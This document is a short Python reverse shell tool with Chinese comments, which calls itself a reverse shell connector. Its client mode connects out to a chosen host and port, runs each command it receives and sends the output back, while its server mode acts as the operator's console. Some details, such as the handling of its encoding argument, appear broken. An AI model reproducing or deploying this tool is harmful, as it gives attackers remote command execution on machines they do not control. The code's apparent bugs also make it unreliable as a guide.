"""
语法示例：
Server Mode：cmd.py -i 127.0.0.1 -p 1234 -s
Client Mode：cmd.py -i 127.0.0.1 -p 1234 -c
"""

"""
实现过程：
cs同体，s端再建立连接之后首先接收一个通信正常的测试信息，之后循环开始，等待输入，然后发送，接收阻塞
（服务端不做线程调用，因为需要用它来作为一个控制端）

c端再建立连接之后首先发送一个通信测试数据，然后循环开始，先接收，再打印，执行之后将结果再发送。
（由于不需要其交互，因此c端的代码以线程调用的方式执行，线程本身不做线程关闭处理，
让其再接收到s端发来的exit时，再自行退出循环，完成线程的停止运行动作。）
"""

import subprocess
import argparse
import socket

encod = ''

def server(host,port): #服务端发送要执行的命令
    print('server:')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen()
    cs, addr = s.accept()
    print('from' + str(addr) + ':' + cs.recv(2048).decode(encoding=encod))   #打印客户端首次连接发来的消息
    while True:
        cmd = input('>')
        cmd = cmd
        cs.send(cmd.encode(encoding=encod))
        if cmd == 'exit':
            break
        elif cmd == '':
            continue
        result = cs.recv(2048).decode(encoding=encod)
        print('\r'+result)
    cs.close()

def client(host,port):      #客户端接受命令执行并回复服务端
    print('client:')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send('Hi!'.encode(encoding=encod))
    while True:
        cmd = s.recv(2048).decode(encoding=encod)
        print(cmd)
        if cmd == 'exit':
            break
        result = cmd_exec(cmd)
        s.send(result.encode(encoding=encod))
    s.close()

def cmd_exec(cmd):      #执行命令，返回字串结果
    # result = cmd + '!'
    try:
        result = subprocess.run(cmd,capture_output=True,timeout=5,encoding=encod)
        if result.stdout == '' and result.stderr != '':
            return result.stderr
        return result.stdout
    except OSError:
        return '命令错误!!'

def main():
    global encod
    parse = argparse.ArgumentParser(description='这是一个反向 Shell 连接器。', add_help=True)
    parse.add_argument('-i','--host',nargs=1,type=str,dest='host')
    parse.add_argument('-p','--port',nargs=1,type=int,dest='port')
    parse.add_argument('-e','--encod', nargs=1,type=str,dest='encod',default='utf-8')
    parse.add_argument('-s','--server',action='store_true',dest='server',help='server mode')
    parse.add_argument('-c','--client',action='store_true',dest='client',help='client mode')
    arg = parse.parse_args()
    encod = arg.encod[0]

    if arg.host != '' and arg.port != '' and arg.server == True:
        server(arg.host[0],arg.port[0])
    elif arg.host != '' and arg.port != '' and arg.client == True:
        client(arg.host[0],arg.port[0])
    else:
        print('命令语法错误!!' + __doc__)

main()